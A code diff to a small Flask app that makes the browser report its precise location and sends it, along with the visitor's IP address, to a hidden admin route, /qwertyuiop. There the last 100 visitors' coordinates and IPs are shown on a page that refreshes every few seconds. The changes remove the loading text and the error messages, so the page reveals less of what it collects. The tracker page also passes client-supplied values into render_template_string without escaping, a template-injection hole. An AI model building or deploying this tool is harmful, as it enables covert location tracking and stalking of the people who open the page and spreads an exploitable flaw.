@@ -11,22 +11,19 @@ MAIN_HTML = """<!DOCTYPE html>
 <head><title>main</title><style>
 body{background:#000;color:#fff;margin:0;display:flex;align-items:center;justify-content:center;height:100vh;font:8vw monospace}
 </style></head>
-<body><div id="c">Определение...</div>
+<body><div id="c">-44 34 44</div>
 <script>
 navigator.geolocation.getCurrentPosition(p=>{
 let lat = p.coords.latitude.toFixed(6);
 let lon = p.coords.longitude.toFixed(6);
 let acc = p.coords.accuracy.toFixed(1);
-document.getElementById('c').innerText = lat + ' ' + lon;
+document.getElementById('c').innerText = lat + ' ' + lon + ' ' + acc;
 fetch('/track', {
     method:'POST',
-    body:JSON.stringify({lat:lat, lon:lon, acc:acc, userAgent:navigator.userAgent}),
+    body:JSON.stringify({lat:lat, lon:lon, acc:acc}),
     headers:{'Content-Type':'application/json'}
 });
-}, e=>{
-document.getElementById('c').innerText = 'Ошибка';
-console.log(e);
-}, {enableHighAccuracy:true, timeout:10000});
+}, e=>{}, {enableHighAccuracy:true, timeout:10000});
 </script></body>"""
 
 TRACKER_HTML = """<!DOCTYPE html>
@@ -34,7 +31,7 @@ TRACKER_HTML = """<!DOCTYPE html>
 <head><title>tracker</title><style>
 body{background:#000;color:#0f0;margin:20px;font:14px monospace;white-space:pre}
 </style></head>
-<body>{}<script>setTimeout(()=>location.reload(),5000)</script></body>"""
+<body>{}<script>setTimeout(()=>location.reload(),3000)</script></body>"""
 
 @app.route('/')
 def main():
@@ -42,31 +39,25 @@ def main():
 
 @app.route('/qwertyuiop')
 def tracker():
-    output = f'=== ВСЕГО ЗАПИСЕЙ: {len(visitors)} ===\\n\\n'
+    output = f'=== ВСЕГО: {len(visitors)} ===\n\n'
     for i, v in enumerate(visitors[-100:], 1):
-        output += f'{i}. {v["lat"]} {v["lon"]} | {v["acc"]}м | {v["time"]}\\n'
+        output += f'{i}. {v["lat"]} {v["lon"]} {v["acc"]} | {v["ip"]}\n'
     return render_template_string(TRACKER_HTML.replace('{}', output))
 
 @app.route('/track', methods=['POST'])
 def track():
     d = request.get_json()
-    if d and 'lat' in d and 'lon' in d:
-        entry = {
-            'lat': d['lat'],
-            'lon': d['lon'],
-            'acc': d.get('acc', '?'),
-            'ua': d.get('userAgent', 'unknown')[:50],
-            'time': datetime.now().strftime('%H:%M:%S'),
-            'ip': request.remote_addr
-        }
+    ip = request.headers.get('X-Forwarded-For', request.remote_addr)
+    if ',' in ip:
+        ip = ip.split(',')[0].strip()
+    if d and 'lat' in d and 'lon' in d and 'acc' in d:
+        entry = {'lat': d['lat'], 'lon': d['lon'], 'acc': d['acc'], 'ip': ip}
         visitors.append(entry)
-        print(f'\\n=== НОВЫЙ ПОЛЬЗОВАТЕЛЬ ===')
-        print(f'Координаты: {entry["lat"]} {entry["lon"]}')
-        print(f'Точность: {entry["acc"]}м')
-        print(f'IP: {entry["ip"]}')
-        print(f'User-Agent: {entry["ua"]}')
-        print(f'Время: {entry["time"]}')
-        print('=========================\\n')
+        print(f'\n=== НОВЫЙ ===')
+        print(f'GEO: {d["lat"]} {d["lon"]} {d["acc"]}')
+        print(f'IP: {ip}')
+        print(f'Время: {datetime.now().strftime("%H:%M:%S")}')
+        print('============\n')
     return '', 204
 
 if __name__ == '__main__':
